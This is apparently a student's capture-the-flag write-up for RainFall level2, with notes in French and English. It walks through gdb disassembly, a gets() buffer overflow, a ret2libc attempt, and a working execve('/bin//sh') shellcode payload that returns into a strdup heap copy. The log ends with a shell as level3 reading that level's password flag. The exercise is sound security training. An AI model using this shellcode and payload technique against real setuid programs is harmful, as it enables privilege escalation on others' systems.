level2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc     
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2      
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass       
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile

level2@RainFall:~$ gdb -q ./level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:      
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp       
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   ;call
   0x08048545 <+6>:     call   0x80484d4 <p>   
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax        
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax      
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>  
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax        
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)       
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax       
   0x080484fb <+39>:    and    $0xb0000000,%eax      
   0x08048500 <+44>:    cmp    $0xb0000000,%eax      
   0x08048505 <+49>:    jne    0x8048527 <p+83>      
   0x08048507 <+51>:    mov    $0x8048620,%eax       
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx       
   0x0804850f <+59>:    mov    %edx,0x4(%esp)        
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt> 
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax      
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>  
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax      
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
(gdb)


Instruction 0x080484ed: call 0x80483c0 <gets@plt> est problématique. La fonction gets est connue pour être vulnérable aux débordements de tampon car elle ne limite pas la quantité de données entrées par l'utilisateur. L'adresse de destination pour gets est stockée dans un emplacement à -0x4c(%ebp).

Instructions 0x080484fb - 0x08048505: Il y a une vérification sur la valeur d'une variable stockée à l'adresse -0xc(%ebp). Si cette valeur commence par 0xb0000000, le programme exécute un printf avec un message stocké à l'adresse 0x8048620 et termine le programme via _exit.

Instructions restantes: Si la vérification échoue, les données stockées sont affichées via puts, puis copiées avec strdup.

En envoyant une chaîne via gets, l'attaquant pourrait écraser la pile pour rediriger l'exécution du programme, potentiellement en profitant de la vérification des adresses ou en forçant l'exécution d'une séquence malveillante.

we can execute the commande system("/bin/sh")

---------------------------------------------------

if we cant find the system function we can search it on the libc
level2@RainFall:~$ ldd ./level2 
        linux-gate.so.1 =>  (0xb7fff000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
        /lib/ld-linux.so.2 (0x80000000)
      
level2@RainFall:~$ gdb -q /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/i386-linux-gnu/libc.so.6...(no debugging symbols found)...done.
(gdb) p system
$1 = {<text variable, no debug info>} 0x3f060 <system>

(gdb) find 0xb7e4000, +9999999, "/bin/sh"


----

----------------
(gdb) r
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? () 
##-> register 80

## find system
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) r
Starting program: /home/user/level2/level2 

Breakpoint 1, 0x08048542 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
## find exit
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>

## find '/bin/sh' in libc
(gdb) info proc map
process 2978
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
         0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
(gdb) x/s 0xb7f8cc58

0xb7f8cc58: "/bin/sh"

## exploiting

[Padding jusqu'à l'adresse de retour] + [Adresse de system] + [Adresse de exit] + [Adresse de "/bin/sh"]
python -c 'print("A"*80 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")' > input.txt
-----------------
## On change de methode 

level2@RainFall:~$ ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                                       = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
)                                                            = 0xbffff6fc
puts(""
)                                                                                                 = 1
strdup("")                                                                                               = 0x0804a008
je vais passer par un shellcode attaque
https://www.exploit-db.com/exploits/39160


\x6a\x0b       ; push byte +0xb          ; Push le numéro de l'appel système execve (11) sur la pile
\x58           ; pop eax                 ; Pop la valeur précédemment poussée (0xb) dans le registre EAX
\x99           ; cdq                     ; Convertir DWORD en double (EAX est déjà 0x0000000b, CDQ étend le signe dans EDX)
\x52           ; push edx                ; Push EDX (qui est 0) sur la pile (argument pour envp = NULL)
\x68\x2f\x2f\x73\x68 ; push 0x68732f2f   ; Push la chaîne "//sh" sur la pile
\x68\x2f\x62\x69\x6e ; push 0x6e69622f   ; Push la chaîne "/bin" sur la pile
\x89\xe3       ; mov ebx, esp            ; Déplacer l'adresse de la chaîne "/bin//sh" dans EBX (premier argument pour execve)
\x31\xc9       ; xor ecx, ecx            ; Mettre ECX à 0 (second argument pour execve, argv = NULL)
\xcd\x80       ; int 0x80                ; Appel système (interruption logicielle pour exécuter l'appel système)

on genere un paterne pour le buffer overflow https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

```
level2@RainFall:~$ gdb -q ./level2 
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

```

0x37634136 pointe sur l offset 80 

je genere un patterne shellcode + 80 - (len shellcode) * 'A' + addresse de retour  
level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > input.txt 
level2@RainFall:~$ cat input.txt - | ./level2

level2@RainFall:~$  cat input.txt - | ./level2
j
 X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
pwd
/home/user/level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02